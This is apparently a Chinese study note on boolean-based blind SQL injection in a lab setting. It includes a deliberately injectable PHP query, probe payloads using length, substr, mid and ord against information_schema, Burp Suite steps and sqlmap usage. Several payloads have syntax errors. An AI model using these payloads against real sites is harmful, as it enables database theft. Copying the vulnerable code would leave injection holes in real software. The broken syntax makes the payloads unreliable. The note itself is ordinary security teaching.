# ==SQL注入利用-布尔盲注==

## **布尔盲注原理**

==布尔盲注适用场景==

==1.WAF或者过滤函数完全过滤掉union关键字==

```php
if(preg_match()'/union/i',$id){
	echo "fail";
	exit;
}
```

==2.页面中不再回显具体数据，但是在SQL语句执行成功或失败时会返回不同内容==

```php
    $conn=mysql_connect('localhost','root','123456') or die ('链接数据库失败!');
    mysql_query('set names utf-8',$conn);
    mysql_query('use web_sql',$conn);
    $sql="select * from person where id = {$id}";
    $res = mysql_query($sql,$conn) or die(mysql_error());
    $row = mysql_fetch_array($res);
    if($row){
        $flag = "success";
    }else{
        $flag = "fail";
    }
```

布尔注入原理：

==利用逻辑关系对SQL语句进行“干预”，例如 `select * from person where id = 1 and 1 = 1`恒为真，输出正确情况==

拼接 `and 1 = 1`的时候

![image-20230830131305276](https://gitee.com/ymq_typroa/typroa/raw/main/image-20230830131305276.png)

拼接 `and 1 = 2`的时候，

![image-20230830130119316](https://gitee.com/ymq_typroa/typroa/raw/main/image-20230830130119316.png)

此时可以确定 and 1=1 和and 1=2 返回不同结果，此时id参数存在SQL注入漏洞。在实际情况中的页面可能会很复杂，此时单纯使用肉眼不太容易分辨，可以下载两者源代码对两者区别

==实验：完成Burpsuite页面比较，挖掘页面是否存在布尔注入利用方式。==

开启截断 -》发送到Repeater -》Repeater中右击发送到compare比较器中 -》 右下方有个words -》打开就是不同的字段

<img src="https://gitee.com/ymq_typroa/typroa/raw/main/image-20230830131825863.png" alt="image-20230830131825863" style="zoom:200%;" />

## 1.获取数据库名称

```
and+length(database())>=num #根据页面返回情况判断数据库长度
and+substr(database(),1,1)='a'  #逐字遍历数据库名称中存在的字符（a可替换，1,1 也是可以变换，从哪里开始，每次检测几个） #substr       substring       mid 三个函数都可以截取字符串其中一部分如果过滤引号，可以适用 and+ord(substr()database(),1,1) = 119 #根据ascii值判断  ord 也可以实现转换为ASCII遍历数据库长度的字符，最终找到数据库名称  web_sql
#substr()database(),1,1  截取数据库名称递第一个字符
```

在发送Repeater之前通过 `and+length(database())>=num`进行判断，直到输出错误，就说明最后一个正确的就是数据库名称字符串的长度

**还有一个较为方便的方法**

截断 -》右击发送至intruder（Ctrl + I） -》选择positions子模块 

<img src="https://gitee.com/ymq_typroa/typroa/raw/main/image-20230830133830192.png" alt="image-20230830133830192" style="zoom:200%;" />

<img src="https://gitee.com/ymq_typroa/typroa/raw/main/image-20230830134105001.png" alt="image-20230830134105001" style="zoom:200%;" />

<img src="https://gitee.com/ymq_typroa/typroa/raw/main/image-20230830134502571.png" alt="image-20230830134502571" style="zoom:200%;" />

好，现在我们知道了数据库名称字符串的长度，那么我们就需要知道具体数据库名称，我们可以一个一个进行字符进行遍历（还是用上面的方法，在Repeater中发送到compare比较器中进行逐字比较），如下

![image-20230830151945784](https://gitee.com/ymq_typroa/typroa/raw/main/image-20230830151945784.png)

<img src="https://gitee.com/ymq_typroa/typroa/raw/main/image-20230830152104217.png" alt="image-20230830152104217" style="zoom:200%;" />

<img src="https://gitee.com/ymq_typroa/typroa/raw/main/image-20230830150856485.png" alt="image-20230830150856485" style="zoom:200%;" />

## 2.获取数据表名称

``` 
and ord(mid(select table_name from information_schema.tables where table_schema='web_sql' limit 2,1)1,1) = 96

其中limit m,n m为起始位置，n为长度。 
limit 0,1 从第0个位置获取1个数据
mid截取表名的字符串  
注意：substr   substring    mid m,n其中m>=1,也就是说m本身就是第几个位置，和下标不同
ord是将截取下来的表名转换为ascii码值,这样检索可以逃逸引号
```

## 3.截取字段名称

```
and ord(mid(select column_name from information_shcma.columns where table_name = 'admin' limit 2,1)1,1) = 97
//select语句是用来获取数据表名称的
//mid函数是用来截取数据包名称字符的
//ord是用来将截取的字符转换为十六进制的
```

## 4.获取数值部分

```
and ord(mid(select 字段 from 表名) 1,1) = 97
```

 <img src="https://gitee.com/ymq_typroa/typroa/raw/main/image-20230830153635418.png" alt="image-20230830153635418" style="zoom:200%;" />

然后使用下面的方式进行检索

![image-20230830153900062](https://gitee.com/ymq_typroa/typroa/raw/main/image-20230830153900062.png)

然后就可以获得想要的flag了

## 简易操作-kali

**实验：完成Sqlmap对注入点进行自动化布尔注入。sqlmap中的 --technique可以指定SQL注入利用的技术，其中B为Boolean布尔注入**

![image-20230830155239834](https://gitee.com/ymq_typroa/typroa/raw/main/image-20230830155239834.png)

<img src="https://gitee.com/ymq_typroa/typroa/raw/main/image-20230830155332279.png" alt="image-20230830155332279" style="zoom:200%;" />

<img src="https://gitee.com/ymq_typroa/typroa/raw/main/image-20230830155514011.png" alt="image-20230830155514011" style="zoom:200%;" />

![image-20230830155736255](https://gitee.com/ymq_typroa/typroa/raw/main/image-20230830155736255.png)

这里有几个注意的地方：

![image-20230830155813667](https://gitee.com/ymq_typroa/typroa/raw/main/image-20230830155813667.png)

我们继续：

<img src="https://gitee.com/ymq_typroa/typroa/raw/main/image-20230830155937259.png" style="zoom:200%;" />

**总结：1.布尔注入适用场景。2.布尔注入利用方式**